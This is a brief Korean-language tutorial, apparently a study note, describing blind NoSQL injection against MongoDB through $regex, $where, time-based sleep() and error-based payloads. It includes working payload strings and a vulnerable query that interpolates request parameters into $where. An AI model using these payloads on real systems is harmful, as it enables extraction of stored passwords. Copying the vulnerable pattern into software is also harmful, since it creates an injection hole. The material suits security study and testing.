mongo db를 기반으로 한 프로그램에서 시도할수있는 블라인드 인젝션 종류이다 

1. $regax 를 이용한 방식

        db.user.find({upw: {$regex: "^a"}})

        db.user.find({upw: {$regex: "^b"}})

        db.user.find({upw: {$regex: "^c"}})
    정규식을 이용해 맞다면 값을 출력하게해 값을 알아낼수 있다

2. $where 를 이용한 방식
        
        > db.user.find({$where:"return 1==1"})
        { "_id" : ObjectId("5ea0110b85d34e079adb3d19"), "uid" : "guest", "upw" : "guest" }
    자바스크립트 표현식을 만족하는 데이터를 조회하는 연산자인 WHERE를 이용해 인젝션할 수 있다. (필드에는 넣을 수 없다)

3. time-based injection

        db.user.find({$where: `this.uid=='${req.query.uid}'&&this.upw=='${req.query.upw}'`});
        /?uid=guest'&&this.upw.substring(0,1)=='g'&&sleep(5000)&&'1
        => 시간 지연 발생.
    실행순서에 따라 앞에있는 where 문이 성공하지 않으면 뒤에 sleep()함수가 실행되지 않기에 가능한 인젝션이다.
4. error-based injection

        > db.user.find({$where: "this.uid=='guest'&&this.upw.substring(0,1)=='g'&&asdf&&'1'&&this.upw=='${upw}'"});
        error: {
            "$err" : "ReferenceError: asdf is not defined near '&&this.upw=='${upw}'' ",
            "code" : 16722
    Time-based 와 비슷하게 앞에있는 where 문이 실행되면 뒤에있는 더미 코드가 실행돼 에러를 발생한다
